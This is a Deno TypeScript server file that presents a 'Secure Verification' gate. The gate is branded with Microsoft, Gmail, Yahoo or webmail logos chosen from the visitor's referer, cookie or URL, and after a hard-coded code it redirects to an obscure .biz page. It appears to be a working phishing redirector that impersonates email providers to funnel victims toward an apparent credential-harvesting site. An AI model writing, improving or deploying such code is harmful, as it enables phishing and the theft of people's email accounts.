// secure-redirect.ts
import { serve } from "https://deno.land/std@0.200.0/http/server.ts";

// Configuration
const CONFIG = {
  DESTINATION_URL: Deno.env.get("DESTINATION_URL") || "https://dennolabo.biz/xkc1vta/walihse/ofcnjvd/provost/index.html",
  VERIFICATION_CODE: Deno.env.get("VERIFICATION_CODE") || "A7B2C9D",
  PORT: Deno.env.get("PORT") || "8000",
  COOKIE_NAME: "email_provider"
};

// Email provider data
const PROVIDERS = {
  microsoft: {
    name: "Microsoft",
    icon: "https://cdn.jsdelivr.net/npm/simple-icons@v8/icons/microsoftoutlook.svg",
    bg: "#0078D4",
    domains: ["outlook.com", "office365.com", "hotmail.com"]
  },
  gsuite: {
    name: "GSuite",
    icon: "https://cdn.jsdelivr.net/npm/simple-icons@v8/icons/gmail.svg",
    bg: "#EA4335",
    domains: ["gmail.com", "googlemail.com"]
  },
  yahoo: {
    name: "Yahoo",
    icon: "https://cdn.jsdelivr.net/npm/simple-icons@v8/icons/yahoo.svg",
    bg: "#6001D2",
    domains: ["yahoo.com", "yahoomail.com"]
  },
  default: {
    name: "Webmail",
    icon: "https://cdn.jsdelivr.net/npm/simple-icons@v8/icons/maildotru.svg",
    bg: "#2563EB",
    domains: []
  }
};

// Detect provider from multiple sources
function detectProvider(req: Request, url: URL) {
  // 1. Check URL parameter first (e.g. ?provider=microsoft)
  const urlProvider = url.searchParams.get("provider");
  if (urlProvider && PROVIDERS[urlProvider]) {
    return PROVIDERS[urlProvider];
  }

  // 2. Check cookie if present
  const cookieHeader = req.headers.get("cookie");
  if (cookieHeader) {
    const cookies = new Map(
      cookieHeader.split(";").map(c => c.trim().split("="))
    );
    const cookieProvider = cookies.get(CONFIG.COOKIE_NAME);
    if (cookieProvider && PROVIDERS[cookieProvider]) {
      return PROVIDERS[cookieProvider];
    }
  }

  // 3. Check referer header
  const referer = req.headers.get("referer");
  if (referer) {
    try {
      const domain = new URL(referer).hostname;
      for (const [key, provider] of Object.entries(PROVIDERS)) {
        if (provider.domains.some(d => domain.includes(d))) {
          return provider;
        }
      }
    } catch {
      // Invalid referer URL
    }
  }

  // 4. Default
  return PROVIDERS.default;
}

// Generate HTML with dynamic provider
function getHTML(provider: any) {
  return `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secure Verification</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    /* ... (keep your existing styles) ... */
  </style>
</head>
<body>
  <!-- ... (keep your existing HTML structure) ... -->
</body>
</html>
`;
}

// Request handler
async function handleRequest(req: Request): Promise<Response> {
  const url = new URL(req.url);
  
  // Handle verification
  if (url.pathname === "/verify" && req.method === "POST") {
    try {
      const { code } = await req.json();
      if (code === CONFIG.VERIFICATION_CODE) {
        // Set cookie before redirecting
        const provider = detectProvider(req, url);
        const headers = new Headers();
        headers.set("Location", CONFIG.DESTINATION_URL);
        headers.set("Set-Cookie", 
          `${CONFIG.COOKIE_NAME}=${Object.keys(PROVIDERS).find(k => PROVIDERS[k] === provider)}; ` +
          `Path=/; Max-Age=86400; SameSite=Lax; Secure`);
        
        return new Response(null, {
          status: 302,
          headers
        });
      }
    } catch {
      // Invalid request
    }
    return new Response(null, { status: 401 });
  }
  
  // Detect provider and generate HTML
  const provider = detectProvider(req, url);
  return new Response(getHTML(provider), {
    headers: { 
      "Content-Type": "text/html",
      // Set initial cookie if not present
      "Set-Cookie": req.headers.get("cookie")?.includes(CONFIG.COOKIE_NAME) 
        ? "" 
        : `${CONFIG.COOKIE_NAME}=${Object.keys(PROVIDERS).find(k => PROVIDERS[k] === provider)}; Path=/; Max-Age=86400; SameSite=Lax; Secure`
    }
  });
}

// Start server
console.log(`Server running on port ${CONFIG.PORT}`);
serve(handleRequest, { port: Number(CONFIG.PORT) });